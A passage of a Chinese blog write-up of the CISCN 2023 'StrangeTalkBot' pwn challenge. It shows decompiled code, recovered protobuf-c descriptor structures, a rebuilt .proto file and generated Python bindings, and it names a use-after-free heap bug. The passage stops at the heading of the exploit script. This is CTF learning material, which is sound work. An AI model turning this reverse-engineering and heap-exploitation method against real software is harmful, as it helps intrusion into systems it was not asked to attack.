class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">PROTOBUF_C_TYPE_INT32,      <span class="comment">/**&lt; int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**&lt; signed int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**&lt; signed int32 (4 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_INT64,      <span class="comment">/**&lt; int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**&lt; signed int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**&lt; signed int64 (8 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**&lt; unsigned int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**&lt; unsigned int32 (4 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**&lt; unsigned int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**&lt; unsigned int64 (8 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**&lt; float */</span></span><br><span class="line">PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**&lt; double */</span></span><br><span class="line">PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**&lt; boolean */</span></span><br><span class="line">PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**&lt; enumerated type */</span></span><br><span class="line">PROTOBUF_C_TYPE_STRING,     <span class="comment">/**&lt; UTF-8 or ASCII string */</span></span><br><span class="line">PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**&lt; arbitrary byte sequence */</span></span><br><span class="line">PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**&lt; nested message */</span></span><br><span class="line">&#125; ProtobufCType;</span><br></pre></td></tr></table></figure><p>而这里type值的定义是这样的，知道这个很重要，在后续的做题环节中需要。</p><p>然而，这种题目一般来说都是用户态的题目，而面对用户态题目我们写的脚本更多的是使用<code>python</code>去写，这里同样可以使用<code>protoc</code>工具生成<code>python</code>文件可以引入的文件。命令为:<code>protoc --python_out=. ./test.proto</code></p><h2 id="StrangeTalkBot"><a href="#StrangeTalkBot" class="headerlink" title="StrangeTalkBot"></a>StrangeTalkBot</h2><p>这道题是ciscn2023的第二道pwn题。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> v3; <span class="comment">// rsi</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init_io();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;byte_A060, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can try to have friendly communication with me now: &quot;</span>);</span><br><span class="line">    v3 = read(<span class="number">0</span>, &amp;byte_A060, <span class="number">0x400</span>uLL);</span><br><span class="line">    v4 = (_QWORD *)sub_192D(<span class="number">0LL</span>, v3, &amp;byte_A060);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_155D(v4[<span class="number">3</span>], v4[<span class="number">4</span>], v4[<span class="number">5</span>], v4[<span class="number">6</span>], v4[<span class="number">7</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  errExit(<span class="number">0LL</span>, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，题目主干比较清晰。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">sub_155D</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 opt,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">unsigned</span> __int64 idx,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 chunk_size,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 content_size,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">const</span> <span class="keyword">void</span> *content)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  size = chunk_size;</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt;= <span class="number">0x21</span> )</span><br><span class="line">    errExit();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)content_size &gt;= <span class="number">0xF1</span> )</span><br><span class="line">    errExit();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)chunk_size &gt;= <span class="number">0xF1</span> )</span><br><span class="line">    errExit();</span><br><span class="line">  <span class="keyword">if</span> ( chunk_size &lt; content_size )</span><br><span class="line">    size = content_size;</span><br><span class="line">  <span class="keyword">if</span> ( opt == <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">delete</span>(idx);</span><br><span class="line">  <span class="keyword">if</span> ( opt &gt; <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">  <span class="keyword">if</span> ( opt == <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">char</span> *)show(idx);</span><br><span class="line">  <span class="keyword">if</span> ( opt == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">char</span> *)create(idx, size, content_size, content);</span><br><span class="line">  <span class="keyword">if</span> ( opt != <span class="number">2</span> )</span><br><span class="line">LABEL_19:</span><br><span class="line">    errExit();</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">char</span> *)edit(idx, content_size, content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在这个函数内部其实就是很经典的菜单类堆题，并且题目中的漏洞也很简单，就是一个很单纯的UAF。麻烦的是<code>sub_192D</code>函数内部的<code>sub_5090</code>有很长的代码。虽然我也不知道怎么猜的，但是他就是<code>protobuf</code>对应的<code>unpack</code>函数。</p><h3 id="理解题目中的protobuf"><a href="#理解题目中的protobuf" class="headerlink" title="理解题目中的protobuf"></a>理解题目中的protobuf</h3><p>需要理解的话，首先就是需要确定题目中各个函数的含义以及部分可能需要知道的结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_192D</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_5090(&amp;unk_9C80, a1, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个函数内部只是调用了另外一个函数，并且返回出另外函数的返回值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">sub_5090</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">const</span> ProtobufCMessageDescriptor *desc,</span></span></span><br><span class="line"><span class="params"><span class="function">        ProtobufCAllocator *a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">unsigned</span> __int64 count,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">unsigned</span> __int8 *content)</span></span></span><br></pre></td></tr></table></figure><p>然而这个函数的返回值是一个指针(参数的类型都是已经经过了我的修改了)。其实通过对比可以发现结构很类似上述中的<code>unpack</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Test *<span class="title">test__unpack</span><span class="params">(ProtobufCAllocator  *allocator, <span class="keyword">size_t</span> len, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (Test *) protobuf_c_message_unpack (&amp;test__descriptor, allocator, len, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，可以通过搜索其内部的字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">actionid_str = desc-&gt;fields_sorted_by_name;</span><br><span class="line">canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="keyword">if</span> ( desc-&gt;magic != <span class="number">0x28AAEEF9</span> )</span><br><span class="line">  __assert_fail(</span><br><span class="line">  <span class="string">&quot;(desc)-&gt;magic == BINARYBF_C__MESSAGE_DESCRIPTOR_MAGIC&quot;</span>,</span><br><span class="line">  <span class="string">&quot;BINARYBF-c/BINARYBF-c.c&quot;</span>,</span><br><span class="line">  <span class="number">0xBF2</span>u,</span><br><span class="line">  <span class="string">&quot;BINARYBF_c_message_unpack&quot;</span>);</span><br></pre></td></tr></table></figure><p>比如函数开头的assert即可搜索到其源码位置。所以这个1200多行的函数其实就是<code>protobuf_c_message_unpack</code>函数。</p><p>那么就可以通过这个函数所使用的参数，直接在ida中添加结构体进行进一步分析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> ProtobufCMessageDescriptor struc ; (<span class="keyword">sizeof</span>=<span class="number">0x78</span>, mappedto_19)</span><br><span class="line"><span class="number">00000000</span> magic dd ?</span><br><span class="line"><span class="number">00000004</span> name dq ?</span><br><span class="line"><span class="number">0000000</span>C short_name dq ?</span><br><span class="line"><span class="number">00000014</span> c_name dq ?</span><br><span class="line"><span class="number">0000001</span>C package_name dq ?</span><br><span class="line"><span class="number">00000024</span> sizeof_message dq ?</span><br><span class="line"><span class="number">0000002</span>C n_fields dd ?</span><br><span class="line"><span class="number">00000030</span> fields dq ?</span><br><span class="line"><span class="number">00000038</span> fields_sorted_by_name dq ?</span><br><span class="line"><span class="number">00000040</span> n_field_ranges dd ?</span><br><span class="line"><span class="number">00000044</span> field_ranges dq ?</span><br><span class="line"><span class="number">0000004</span>C message_init ProtobufCMessage ?</span><br><span class="line"><span class="number">00000060</span> reserved1 dq ?</span><br><span class="line"><span class="number">00000068</span> reserved2 dq ?</span><br><span class="line"><span class="number">00000070</span> reserved3 dq ?</span><br><span class="line"><span class="number">00000078</span> ProtobufCMessageDescriptor ends</span><br><span class="line"><span class="number">00000078</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> ProtobufCMessage struc ; (<span class="keyword">sizeof</span>=<span class="number">0x14</span>, mappedto_21)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: ProtobufCMessageDescriptor/r</span><br><span class="line"><span class="number">00000000</span> descriptor dq ?</span><br><span class="line"><span class="number">00000008</span> n_unknown_fields dd ?</span><br><span class="line"><span class="number">0000000</span>C unknown_fields dq ?</span><br><span class="line"><span class="number">00000014</span> ProtobufCMessage ends</span><br><span class="line"><span class="number">00000014</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> ProtobufCAllocator struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_22)</span><br><span class="line"><span class="number">00000000</span> alloc dq ?</span><br><span class="line"><span class="number">00000008</span> <span class="built_in">free</span> dq ?</span><br><span class="line"><span class="number">00000010</span> allocator_data dq ?</span><br><span class="line"><span class="number">00000018</span> ProtobufCAllocator ends</span><br><span class="line"><span class="number">00000018</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> ProtobufCFieldDescriptor struc ; (<span class="keyword">sizeof</span>=<span class="number">0x44</span>, mappedto_23)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: .data.rel.ro:stru_9B60/r</span><br><span class="line"><span class="number">00000000</span> name dq ?</span><br><span class="line"><span class="number">00000008</span> id dd ?</span><br><span class="line"><span class="number">0000000</span>C label dd ?</span><br><span class="line"><span class="number">00000010</span> type dd ?</span><br><span class="line"><span class="number">00000014</span> quantifier_offset dd ?</span><br><span class="line"><span class="number">00000018</span> offset dd ?</span><br><span class="line"><span class="number">0000001</span>C descriptor dq ?</span><br><span class="line"><span class="number">00000024</span> default_value dq ?</span><br><span class="line"><span class="number">0000002</span>C flags dd ?</span><br><span class="line"><span class="number">00000030</span> reserved_flags dd ?</span><br><span class="line"><span class="number">00000034</span> reserved2 dq ?</span><br><span class="line"><span class="number">0000003</span>C reserved3 dq ?</span><br><span class="line"><span class="number">00000044</span> ProtobufCFieldDescriptor ends</span><br></pre></td></tr></table></figure><p>在前面我们提到了<code>ProtobufCFieldDescriptor</code>结构体，这个结构体中存储着结构体中所有成员的数据类型，并且第一个成员是指向其名字的地址，那么我们可以根据字符串找到结构体相印的位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:0000000000009B60 80 70 00 00 00 00 00 00 01 00+stru_9B60 ProtobufCFieldDescriptor &lt;7080h, 1, 0, 4, 0, 18h, 0, 0, 0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 00 00 04 00 00 00+                                        ; DATA XREF: .data.rel.ro:0000000000009CB8↓o</span><br><span class="line">.data.rel.ro:0000000000009BA4 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BA5 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BA6 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BA7 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BA8                               ; ProtobufCFieldDescriptor</span><br><span class="line">.data.rel.ro:0000000000009BA8 89 70 00 00 00 00 00 00 02 00+ProtobufCFieldDescriptor &lt;7089h, 2, 0, 4, 0, 20h, 0, 0, 0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000009BEC 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BED 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BEE 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BEF 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BF0                               ; ProtobufCFieldDescriptor</span><br><span class="line">.data.rel.ro:0000000000009BF0 90 70 00 00 00 00 00 00 03 00+ProtobufCFieldDescriptor &lt;7090h, 3, 0, 4, 0, 28h, 0, 0, 0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000009C34 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009C35 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009C36 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009C37 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009C38                               ; ProtobufCFieldDescriptor</span><br><span class="line">.data.rel.ro:0000000000009C38 98 70 00 00 00 00 00 00 04 00+ProtobufCFieldDescriptor &lt;7098h, 4, 0, 0Fh, 0, 30h, 0, 0, 0, 0, 0, 0&gt;</span><br></pre></td></tr></table></figure><p>最终可以得出，前面三个成员的数据类型为<code>sint64</code>，最后一个成员的数据类型为<code>bytes</code>，所以可以自己写出<code>proto</code>文件了。</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">Devicemsg</span></span>&#123;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">sint64</span> actionid = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">sint64</span> msgidx = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">sint64</span> msgsize = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">bytes</span> msgcontent = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后使用上述代码生成<code>python</code>对应的文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span></span><br><span class="line"><span class="comment"># source: Devicemsg.proto</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">_b=sys.version_info[<span class="number">0</span>]&lt;<span class="number">3</span> <span class="keyword">and</span> (<span class="keyword">lambda</span> x:x) <span class="keyword">or</span> (<span class="keyword">lambda</span> x:x.encode(<span class="string">&#x27;latin1&#x27;</span>))</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> descriptor <span class="keyword">as</span> _descriptor</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> message <span class="keyword">as</span> _message</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> reflection <span class="keyword">as</span> _reflection</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> symbol_database <span class="keyword">as</span> _symbol_database</span><br><span class="line"><span class="comment"># @@protoc_insertion_point(imports)</span></span><br><span class="line"></span><br><span class="line">_sym_db = _symbol_database.Default()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DESCRIPTOR = _descriptor.FileDescriptor(</span><br><span class="line">  name=<span class="string">&#x27;Devicemsg.proto&#x27;</span>,</span><br><span class="line">  package=<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  syntax=<span class="string">&#x27;proto2&#x27;</span>,</span><br><span class="line">  serialized_options=<span class="literal">None</span>,</span><br><span class="line">  serialized_pb=_b(<span class="string">&#x27;\n\x0f\x44\x65vicemsg.proto\&quot;R\n\tDevicemsg\x12\x10\n\x08\x61\x63tionid\x18\x01 \x02(\x12\x12\x0e\n\x06msgidx\x18\x02 \x02(\x12\x12\x0f\n\x07msgsize\x18\x03 \x02(\x12\x12\x12\n\nmsgcontent\x18\x04 \x02(\x0c&#x27;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_DEVICEMSG = _descriptor.Descriptor(</span><br><span class="line">  name=<span class="string">&#x27;Devicemsg&#x27;</span>,</span><br><span class="line">  full_name=<span class="string">&#x27;Devicemsg&#x27;</span>,</span><br><span class="line">  filename=<span class="literal">None</span>,</span><br><span class="line">  file=DESCRIPTOR,</span><br><span class="line">  containing_type=<span class="literal">None</span>,</span><br><span class="line">  fields=[</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;actionid&#x27;</span>, full_name=<span class="string">&#x27;Devicemsg.actionid&#x27;</span>, index=<span class="number">0</span>,</span><br><span class="line">      number=<span class="number">1</span>, <span class="built_in">type</span>=<span class="number">18</span>, cpp_type=<span class="number">2</span>, label=<span class="number">2</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=<span class="number">0</span>,</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;msgidx&#x27;</span>, full_name=<span class="string">&#x27;Devicemsg.msgidx&#x27;</span>, index=<span class="number">1</span>,</span><br><span class="line">      number=<span class="number">2</span>, <span class="built_in">type</span>=<span class="number">18</span>, cpp_type=<span class="number">2</span>, label=<span class="number">2</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=<span class="number">0</span>,</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;msgsize&#x27;</span>, full_name=<span class="string">&#x27;Devicemsg.msgsize&#x27;</span>, index=<span class="number">2</span>,</span><br><span class="line">      number=<span class="number">3</span>, <span class="built_in">type</span>=<span class="number">18</span>, cpp_type=<span class="number">2</span>, label=<span class="number">2</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=<span class="number">0</span>,</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;msgcontent&#x27;</span>, full_name=<span class="string">&#x27;Devicemsg.msgcontent&#x27;</span>, index=<span class="number">3</span>,</span><br><span class="line">      number=<span class="number">4</span>, <span class="built_in">type</span>=<span class="number">12</span>, cpp_type=<span class="number">9</span>, label=<span class="number">2</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=_b(<span class="string">&quot;&quot;</span>),</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">  ],</span><br><span class="line">  extensions=[</span><br><span class="line">  ],</span><br><span class="line">  nested_types=[],</span><br><span class="line">  enum_types=[</span><br><span class="line">  ],</span><br><span class="line">  serialized_options=<span class="literal">None</span>,</span><br><span class="line">  is_extendable=<span class="literal">False</span>,</span><br><span class="line">  syntax=<span class="string">&#x27;proto2&#x27;</span>,</span><br><span class="line">  extension_ranges=[],</span><br><span class="line">  oneofs=[</span><br><span class="line">  ],</span><br><span class="line">  serialized_start=<span class="number">19</span>,</span><br><span class="line">  serialized_end=<span class="number">101</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">DESCRIPTOR.message_types_by_name[<span class="string">&#x27;Devicemsg&#x27;</span>] = _DEVICEMSG</span><br><span class="line">_sym_db.RegisterFileDescriptor(DESCRIPTOR)</span><br><span class="line"></span><br><span class="line">Devicemsg = _reflection.GeneratedProtocolMessageType(<span class="string">&#x27;Devicemsg&#x27;</span>, (_message.Message,), <span class="built_in">dict</span>(</span><br><span class="line">  DESCRIPTOR = _DEVICEMSG,</span><br><span class="line">  __module__ = <span class="string">&#x27;Devicemsg_pb2&#x27;</span></span><br><span class="line">  <span class="comment"># @@protoc_insertion_point(class_scope:Devicemsg)</span></span><br><span class="line">  ))</span><br><span class="line">_sym_db.RegisterMessage(Devicemsg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># @@protoc_insertion_point(module_scope)</span></span><br></pre></td></tr></table></figure><p>现在就只需要拿着这个文件去使用即可，后续的漏洞利用部分比较简单，这里就不详细说了。</p><h3 id="综上可得，exp"><a href="#综上可得，exp" class="headerlink" title="综上可得，exp"></a>综上可得，exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 